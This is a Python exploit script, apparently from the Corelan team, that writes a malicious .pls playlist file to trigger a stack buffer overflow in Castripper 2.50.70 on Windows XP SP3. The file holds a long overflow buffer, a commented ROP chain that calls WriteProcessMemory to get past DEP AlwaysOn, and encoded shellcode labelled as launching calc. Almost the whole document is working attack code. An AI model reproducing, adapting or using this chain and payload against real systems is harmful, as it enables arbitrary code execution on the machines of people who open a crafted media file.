#!/usr/bin/python
#
# Castripper 2.50.70 (.pls) stack buffer overflow w/ DEP bypass exploit
# Author: mr_me - https://net-ninja.net - mr_me [AT] corelan.be
# Download: http://www.mini-stream.net/castripper/
# Tested on Wind0ws XP SP3 /noexecute=alwayson 
# Greetz: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/ 
#
# DEP AlwaysOn bypass version
# All rop gadgets are from the app's dll except for the hardcoded wpm()
# and the 'XCHG EAX,EBX' which is from ntdll.dll (non aslr).
# Thanks again to Sud0 and Lincoln for the motivation, you guys rock
 
def banner(): 
    print "|------------------------------------------------------------------|" 
    print "|                         __               __                      |" 
    print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |" 
    print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |" 
    print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |" 
    print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |" 
    print "|                                                                  |"     
    print "|-------------------------------------------------[ EIP Hunters ]--|" 
    print "[+] Castripper 2.50.70 (.pls) stack buffer overflow w/ DEP bypass exploit" 
 
# calc
sc = ("\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
"\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"
"\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"
"\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"
"\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"
"\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"
"\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"
"\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"
"\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"
"\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"
"\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"
"\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"
"\x51\x42\x4c\x42\x43\x43\x30\x41\x41");
 
crash = "\x41" * 26065
 
rop = "\x0d\x0e\x01\x10"    # MOV EAX,EDX # POP EDI # RETN                      : 0x10010E0D
rop += "\x41\x41\x41\x41"   # JUNK ---------^^^^
rop += "\x41\x41\x41\x41"   # JUNK ---------^^^^
 
# get the shellcode len argv
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
rop += "\x04\x33\x01\x10"   # ADD EAX,-33 # RETN                                : 0x10013304
 
# close your eyes and think of the magic
rop += "\x27\xd1\x9e\x7c"   # XCHG EAX,EBX # JUNK # POP ESI # POP EBP # RETN 4  : 0x7C9ED127
rop += "\xff\xff\xff\xff"   # -1 for hProcess
rop += "\xcf\x22\x80\x7c"   # @ to patch in kernel32.dll                        : 0x7C8022CF
rop += "\xad\x0b\x01\x10"   # POP EDI # RETN                                    : 0x10010BAD
rop += "\x41\x41\x41\x41"   # JUNK --------------------------------------^^^^
rop += "\x13\xeb\x02\x10"   # CALL EAX # JUNK                                   : 0x1002EB13
rop += "\xeb\x87\x01\x10"   # POP EBP # RETN                                    : 0x100187EB
rop += "\xcf\x22\x80\x7c"   # @ to patch in kernel32.dll                        : 0x7C8022CF
rop += "\xf7\x43\x02\x10"   # POP EDX # RETN                                    : 0x100243F7
rop += "\x44\x9f\x04\x10"   # @ that is writeable                               : 0x10049F44
rop += "\x19\x53\x02\x10"   # POP EAX # RETN                                    : 0x10025319
rop += "\x13\x22\x80\x7c"   # @ of WriteProcessMemory()                         : 0x7C802213
rop += "\xbd\xe3\x01\x10"   # PUSHAD # RETN                                     : 0x1001E3BD
 
junk = "\x43" * 1000
buffer = crash + rop + sc + junk
banner()
print "[+] building .pls file.."
m3ufile = open('cst-tryharder.pls','w')
m3ufile.write(buffer)
m3ufile.close()
print "[+] Done !"